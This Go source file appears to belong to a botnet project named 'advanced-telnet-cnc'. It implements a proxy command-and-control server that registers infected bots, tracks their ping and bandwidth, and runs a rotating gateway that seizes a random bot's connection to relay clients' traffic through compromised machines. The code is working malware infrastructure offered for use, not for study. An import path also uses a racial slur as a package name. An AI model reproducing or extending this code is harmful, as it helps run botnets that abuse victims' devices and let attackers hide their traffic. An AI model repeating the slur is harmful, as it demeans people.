package proxy

import (
	"advanced-telnet-cnc/source/config"
	slave_v2 "advanced-telnet-cnc/source/niggers/v2"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"sync"
	"time"
)

type BotProxy struct {
	IP        string
	Country   string
	Conn      net.Conn
	Ping      time.Duration
	LastSeen  time.Time
	LastSpeed string
	SpeedMbps float64
	Active    bool
	Hijacked  bool
	Mutex     sync.RWMutex
}

const (
	C2Addr         = "0.0.0.0:2222"
	RotatorAddr    = "0.0.0.0:8080"
	BotSocksPort   = "26721"
	ProxyFile      = "proxies.txt"
	HealthInterval = 10 * time.Second
	PingInterval   = 5 * time.Second
)

var (
	proxies     = make(map[string]*BotProxy)
	proxyMutex  sync.RWMutex
	maxProxies  = 1024000
	activeConns int32
)

func Start() {
	//loadProxies()
	//go startC2Listener()
	//go startRotatingGateway()
	//go startHealthChecker()

	// Stats logger
	go func() {
		for {
			proxyMutex.RLock()
			pCount := len(proxies)
			proxyMutex.RUnlock()
			fmt.Printf("\r[*] Active Bots: %d | Active Cons: %d    ", pCount, int(activeConns))
			time.Sleep(1 * time.Second)
		}
	}()
}

func startC2Listener() {
	l, err := net.Listen("tcp", C2Addr)
	if err != nil {
		config.Logger.Error("C2 Listener error", "err", err)
		return
	}
	defer l.Close()

	config.Logger.Info("Proxy C2 Listener started", "addr", C2Addr)

	for {
		conn, err := l.Accept()
		if err != nil {
			continue
		}

		ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
		go handleProxyBot(conn, ip)
	}
}

func handleProxyBot(conn net.Conn, ip string) {
	proxyMutex.Lock()
	if p, exists := proxies[ip]; exists && p.Conn != nil {
		p.Conn.Close() // Close old connection if any
	}

	bot := &BotProxy{
		IP:       ip,
		Country:  slave_v2.GetCountry(ip),
		Conn:     conn,
		LastSeen: time.Now(),
		Active:   true,
	}
	proxies[ip] = bot
	proxyMutex.Unlock()

	saveProxy(ip)
	config.Logger.Info("New proxy bot registered", "ip", ip)

	defer func() {
		if !bot.Hijacked {
			proxyMutex.Lock()
			delete(proxies, ip)
			proxyMutex.Unlock()
			conn.Close()
			config.Logger.Info("Proxy bot disconnected", "ip", ip)
		} else {
			config.Logger.Info("Proxy bot connection handed over for hijacking", "ip", ip)
		}
	}()

	// Ping loop and Heartbeat listener
	go func() {
		for {
			// Send Ping (Ox01)
			_, err := conn.Write([]byte{0x01})
			if err != nil {
				return
			}

			// Wait for Pong (handled by the main loop below or a separate read)
			time.Sleep(PingInterval)
		}
	}()

	buf := make([]byte, 1)
	for {
		conn.SetReadDeadline(time.Now().Add(PingInterval * 2))
		_, err := conn.Read(buf)
		if err != nil {
			return
		}

		if buf[0] == 0x02 { // PONG
			proxyMutex.Lock()
			if b, ok := proxies[ip]; ok {
				b.Ping = time.Since(b.LastSeen) // b.LastSeen was the time when PING was sent
				b.LastSeen = time.Now()
			}
			proxyMutex.Unlock()
		} else if buf[0] == 0x03 { // SPEED REPORT
			// Read result string
			speedBuf := make([]byte, 32)
			n, err := conn.Read(speedBuf)
			if err == nil && n > 0 {
				proxyMutex.Lock()
				if b, ok := proxies[ip]; ok {
					b.LastSpeed = string(speedBuf[:n])
					var speed float64
					fmt.Sscanf(b.LastSpeed, "%f", &speed)
					b.SpeedMbps = speed
				}
				proxyMutex.Unlock()
			}
		}
	}
}

func startRotatingGateway() {
	l, err := net.Listen("tcp", RotatorAddr)
	if err != nil {
		config.Logger.Error("Rotator error", "err", err)
		return
	}
	defer l.Close()

	config.Logger.Info("Proxy Rotator started", "addr", RotatorAddr)

	for {
		conn, err := l.Accept()
		if err != nil {
			continue
		}
		go handleRotatorClient(conn)
	}
}

func handleRotatorClient(clientConn net.Conn) {
	defer clientConn.Close()

	proxyMutex.Lock()
	if len(proxies) == 0 {
		proxyMutex.Unlock()
		return
	}

	// Filter for bots with active connections that aren't being used
	var availableKeys []string
	for k, b := range proxies {
		if b.Active && b.Conn != nil {
			availableKeys = append(availableKeys, k)
		}
	}

	if len(availableKeys) == 0 {
		proxyMutex.Unlock()
		return
	}

	// Randomly pick a connected bot
	targetIP := availableKeys[rand.Intn(len(availableKeys))]
	targetBot := proxies[targetIP]

	// Hijack the connection: set past deadline to force handleProxyBot loop to exit
	botConn := targetBot.Conn
	targetBot.Hijacked = true
	botConn.SetDeadline(time.Now())

	// Remove from pool while in use (bot will reconnect or be re-added on loop exit if we wanted,
	// but for reverse proxy it's usually cleaner to have it reconnect for a fresh session)
	delete(proxies, targetIP)
	proxyMutex.Unlock()

	// Wait a moment for handleProxyBot to see the deadline error and exit its read loop
	time.Sleep(20 * time.Millisecond)

	// Reset deadlines for the actual proxy traffic
	botConn.SetDeadline(time.Time{})

	// Relay data
	errChan := make(chan error, 2)
	go relay(clientConn, botConn, errChan)
	go relay(botConn, clientConn, errChan)

	<-errChan
	botConn.Close()
}

func relay(dst, src net.Conn, errChan chan error) {
	_, err := io.Copy(dst, src)
	errChan <- err
}

func loadProxies() {
	f, err := os.Open(ProxyFile)
	if err != nil {
		return
	}
	defer f.Close()

	proxyMutex.Lock()
	defer proxyMutex.Unlock()

	var ip string
	for {
		_, err := fmt.Fscanf(f, "%s\n", &ip)
		if err != nil {
			break
		}
		proxies[ip] = &BotProxy{IP: ip, Country: slave_v2.GetCountry(ip), LastSeen: time.Now(), Active: false}
	}
}

func saveProxy(ip string) {
	f, err := os.OpenFile(ProxyFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	fmt.Fprintf(f, "%s\n", ip)
}

func rewriteProxyFile() {
	f, err := os.Create(ProxyFile)
	if err != nil {
		return
	}
	defer f.Close()

	for _, bot := range proxies {
		fmt.Fprintf(f, "%s\n", bot.IP)
	}
}

func startHealthChecker() {
	for {
		time.Sleep(HealthInterval)

		proxyMutex.Lock()
		for ip, bot := range proxies {
			if time.Since(bot.LastSeen) > HealthInterval*3 {
				config.Logger.Info("Proxy bot timeout, removing", "ip", ip)
				if bot.Conn != nil {
					bot.Conn.Close()
				}
				delete(proxies, ip)
				rewriteProxyFile()
			}
		}
		proxyMutex.Unlock()
	}
}

func GetStats() (int, int) {
	proxyMutex.RLock()
	defer proxyMutex.RUnlock()
	return len(proxies), int(activeConns)
}

func GetList() []*BotProxy {
	proxyMutex.RLock()
	defer proxyMutex.RUnlock()
	l := make([]*BotProxy, 0, len(proxies))
	for _, b := range proxies {
		l = append(l, b)
	}
	return l
}

func CalculateTotalTraffic() string {
	proxyMutex.RLock()
	defer proxyMutex.RUnlock()
	var totalMbps float64
	for _, b := range proxies {
		totalMbps += b.SpeedMbps
	}

	if totalMbps >= 1024*1024 {
		return fmt.Sprintf("%.2f Tbps", totalMbps/(1024*1024))
	} else if totalMbps >= 1024 {
		return fmt.Sprintf("%.2f Gbps", totalMbps/1024)
	}
	return fmt.Sprintf("%.2f Mbps", totalMbps)
}
